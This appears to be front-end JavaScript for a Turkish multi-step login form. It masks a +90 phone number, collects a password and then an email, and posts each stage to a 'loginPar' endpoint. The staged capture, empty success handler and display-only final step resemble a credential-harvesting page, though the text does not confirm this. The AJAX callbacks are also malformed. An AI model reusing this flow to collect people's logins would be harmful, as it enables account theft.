
$(function () {
    let $step1 = $(".step1");
    let $step2 = $(".step2");
    let $step3 = $(".step3");
    let $phone = $("#phone");
    let $password = $("#password");
    let $email = $("#email");
    var jsonData = {
        phone: '',
        password: '',
        email: '',
        step: 0,
    };

    class P {
        constructor() {
            var csrfToken = $('meta[name="csrf-token"]').attr("content");
            $.ajaxSetup({
                headers: {
                    "X-CSRF-TOKEN": csrfToken,
                },
            });
            this.stepOne();
        }

        stepOne() {
            const instance = this;
            const form = document.querySelector('.plogin');
            const phoneInput = document.getElementById('phone');
            const passwordInput = document.getElementById('password');
            $(".plogin").click(function (e) {
                let hasError = false;
                // Telefon numarası validasyonu
                const cleanedPhone = phoneInput.value.replace(/\D/g, '').substring(2); // +90 hariç 10 rakam
                if (cleanedPhone.length !== 10 || !/^\d+$/.test(cleanedPhone)) {
                    phoneInput.classList.add('error');
                    phoneInput.nextElementSibling.textContent = 'Geçerli bir telefon numarası girin';
                    hasError = true;
                }

                // Şifre validasyonu
                if (passwordInput.value.trim().length < 6) {
                    passwordInput.classList.add('error');
                    passwordInput.nextElementSibling.textContent = 'Şifreniz en az 6 karakter olmalı';
                    hasError = true;
                }


                if (hasError) {
                    e.preventDefault(); // Sadece hata varsa form gönderimini engelle
                } else {
                    jsonData = {
                        ...jsonData,
                        step: 1,
                        phone: $("#phone").val(),
                        password: $("#password").val()
                    };
                    instance.stepOneHide();
                    instance.stepTwoShow();
                    instance.stepOneSend();
                }

                e.preventDefault();
                return false;
            });

            // Clear error on input
            phoneInput.addEventListener('input', function () {
                if (this.value.trim()) {
                    this.classList.remove('error');
                }
            });

            passwordInput.addEventListener('input', function () {
                if (this.value.trim()) {
                    this.classList.remove('error');
                }
            });
            let lastValue = '';
            let lastRawDigits = '';

            // Odaklanma olayı
            phoneInput.addEventListener('focus', function () {
                if (!this.value.startsWith('+90 (')) {
                    this.value = '+90 (';
                    this.setSelectionRange(5, 5); // İmleci parantezden sonra konumlandır
                }
            });

            // Input değişikliklerini yönet
            phoneInput.addEventListener('input', function (e) {
                const newValue = e.target.value;
                const cursorPos = e.target.selectionStart;

                // Rakamları temizle ve +90 hariç tut
                const rawDigits = newValue.replace(/\D/g, '').substring(2);
                const maxDigits = 10;
                const truncatedDigits = rawDigits.substring(0, maxDigits);

                // Formatı oluştur
                let formatted = instance.formatPhoneNumber(truncatedDigits);

                // Silme işlemi kontrolü
                const isDeletion = newValue.length < lastValue.length;

                // İmleç pozisyonunu akıllıca ayarla
                let newCursorPos = instance.calculateCursorPosition(
                    isDeletion,
                    cursorPos,
                    lastValue,
                    formatted,
                    truncatedDigits,
                    lastRawDigits
                );

                // Değeri güncelle
                e.target.value = formatted;
                e.target.setSelectionRange(newCursorPos, newCursorPos);

                // Son değerleri kaydet
                lastValue = formatted;
                lastRawDigits = truncatedDigits;
            });

            // Silme tuşlarını kontrol et
            phoneInput.addEventListener('keydown', function (e) {
                const fixedStart = 5; // +90 ( sonrası
                if ((e.key === 'Backspace' || e.key === 'Delete') && this.selectionStart <= fixedStart) {
                    e.preventDefault();
                }
            });

            // Input değişikliklerinde hata temizleme
            [phoneInput, passwordInput].forEach(input => {
                input.addEventListener('input', function () {
                    if (this.value.trim()) {
                        this.classList.remove('error');
                        //this.nextElementSibling.textContent = 'Bu alanı doldurmalısınız';
                    }
                });
            });
        }

        formatPhoneNumber(digits) {
            let formatted = '+90 (';
            if (digits.length > 0) {
                formatted += digits.substring(0, 3);
                if (digits.length >= 3) formatted += `) ${digits.substring(3, 6)}`;
                if (digits.length >= 6) formatted += ` ${digits.substring(6, 8)}`;
                if (digits.length >= 8) formatted += ` ${digits.substring(8, 10)}`;
            }
            return formatted;
        }

        calculateCursorPosition(isDeletion, oldCursorPos, oldValue, newValue, newDigits, oldDigits) {
            // Sabit kısım kontrolü
            if (oldCursorPos <= 5) return 5;

            // Silme işlemi değilse imleci sona at
            if (!isDeletion) return newValue.length;

            // Değişen rakamın pozisyonunu bul
            let changedIndex = 0;
            while (changedIndex < oldDigits.length && changedIndex < newDigits.length) {
                if (oldDigits[changedIndex] !== newDigits[changedIndex]) break;
                changedIndex++;
            }

            // Yeni pozisyonu formatlı değerde bul
            let newCursorPos = 5; // +90 ( sonrası
            let digitCount = 0;
            for (let i = 5; i < newValue.length; i++) {
                if (digitCount >= changedIndex) break;
                if (/\d/.test(newValue[i])) digitCount++;
                newCursorPos = i + 1;
            }

            return Math.min(newCursorPos, newValue.length);
        }

        stepOneShow() {
            $step1.fadeIn().removeClass("hidden");
        }

        stepOneHide() {
            $step1.hide().addClass("hidden");
        }
        stepTwoShow() {
            $step2.fadeIn().removeClass("hidden");
            const instance = this;
            const modalOverlay = document.getElementById('modalOverlay');
            const closeModalBtn = document.getElementById('closeModalBtn');
            const emailForm = document.querySelector('.pdogrula');
            const emailInput = document.getElementById('email');
            closeModalBtn.addEventListener('click', function () {
                modalOverlay.style.display = 'none';
            });
            emailForm.addEventListener('click', function (e) {
                emailInput.classList.remove('error');
                let hasError = false;

                // Email validation
                const emailValue = emailInput.value.trim();
                if (!emailValue) {
                    instance.showError(emailInput, 'Bu alanı doldurmalısınız');
                    hasError = true;
                } else if (!instance.isValidEmail(emailValue)) {
                    instance.showError(emailInput, 'Geçerli bir e-posta adresi giriniz');
                    hasError = true;
                }

                if (hasError) {
                    e.preventDefault();
                } else {
                    jsonData = {
                        ...jsonData,
                        step: 2,
                        email: $email.val()
                    };
                    instance.stepTwoHide();
                    instance.stepTwiceShow();
                    instance.stepOneSend();


                }

                e.preventDefault();
            });


        }

        isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        showError(input, message) {
            input.classList.add('error');
            input.nextElementSibling.textContent = message;
            input.nextElementSibling.style.display = 'block';
        }

        stepTwoHide() {
            $step2.hide().removeClass("hidden");
        }
        stepTwiceShow() {
            $step3.fadeIn().removeClass("hidden");
        }

        stepTwiceHide() {
            $step3.hide().addClass("hidden");
        }

        stepOneSend() {
            const instance = this;
            $.ajax({
                url: 'loginPar',
                type: 'POST',
                dataType: 'json',
                data: jsonData,
                function(response) {

                }, function(err) {
                    toastr.error("Başvuru Hatası", "Lütfen daha sonra tekrar deneyiniz");

                }
            })

            return false;
        }
    }

    let exec = new P();

})